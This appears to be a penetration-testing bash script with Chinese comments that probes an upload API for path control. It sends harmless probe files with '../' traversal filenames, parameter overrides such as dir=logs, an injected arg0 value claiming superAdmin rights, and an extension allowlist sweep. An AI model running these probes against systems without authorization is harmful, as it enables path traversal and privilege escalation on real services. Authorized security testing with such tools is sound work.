#!/usr/bin/env bash
# 上传点「路径可控性」四问判定矩阵 v1 —— 只发无害内容，绝不上传可执行载荷。
# 用法: ./upload_path_control_matrix.sh 'https://TARGET/api/x/upload' 'Authorization: Bearer XXX' 'X-Login-Type: 9'
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./upload_path_control_matrix.sh <upload-url>\n' >&2; exit 1; fi
UP="${1:?upload url}"
AUTH="${2:?auth header value}"
LT="${3:-}"
W=$(mktemp -d); printf 'PROBE-%s\n' "$(date +%s)" > "$W/p.txt"; : > "$W/empty.txt"
H=(-H "$AUTH"); [ -n "$LT" ] && H+=(-H "$LT")
call() { # $1=label  $2=filename  $3=content-type  $4..=extra -F
  local label="$1" fn="$2" ct="$3"; shift 3
  printf '\n=== %s ===\n' "$label"
  curl -sS --max-time 25 "${H[@]}" "$@" \
    -F "file=@$W/p.txt;filename=$fn;type=$ct" "$UP" \
    | python3 -c "import json,sys
d=json.load(sys.stdin); x=d.get('data')
fp = x.get('filePath') if isinstance(x,dict) else (x if isinstance(x,str) else '')
print('code=',d.get('code'),'msg=',(d.get('msg') or '')[:90])
print('filePath=',fp)"
  sleep 2
}

# 问① key 是否含 fileName / 是否服务端生成
call "Q1 baseline (safe ext)"            'probe_<RANDOM>.txt' 'text/plain'
# 问② ../ 是扩展名拒还是穿越检测（看 msg 有没有原样带出文件名）
call "Q2 traversal + forbidden ext"      '../../logs/probe.log' 'text/plain'
call "Q2b traversal + allowed ext"       '../../probe.txt'      'text/plain'
# 问③ 额外参数能否改变 key 前缀
call "Q3 ossType/type/dir overrides"     'probe.txt' 'text/plain' -F 'ossType=1' -F 'type=1' -F 'dir=logs'
PAY=$(python3 -c "import urllib.parse;print(urllib.parse.quote('{\"id\":1,\"tenantId\":1,\"superAdmin\":true}'))")
printf '\n=== Q3b arg0 current-user override ===\n'
curl -sS --max-time 25 "${H[@]}" -F "file=@$W/p.txt;filename=probe.txt;type=text/plain" "${UP}?arg0=$PAY" \
  | python3 -c "import json,sys;d=json.load(sys.stdin);x=d.get('data');print('code=',d.get('code'),'filePath=',(x or {}).get('filePath') if isinstance(x,dict) else x)"
sleep 2
# 问④ 扩展名白名单范围（尤其 .log/.html/.svg/.zip）
for ext in log json csv html svg zip txt; do
  printf 'EXT %-5s ' "$ext"
  curl -sS --max-time 25 "${H[@]}" -F "file=@$W/empty.txt;filename=probe.$ext;type=application/octet-stream" "$UP" \
    | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('code'),(d.get('msg') or '')[:70])"
  sleep 2
done
echo
echo '判读: 仅当 ①key 含调用方可控片段 且 ②该片段未被规范化/未被白名单挡下 时，才构成任意路径写入。'
rm -rf "$W"
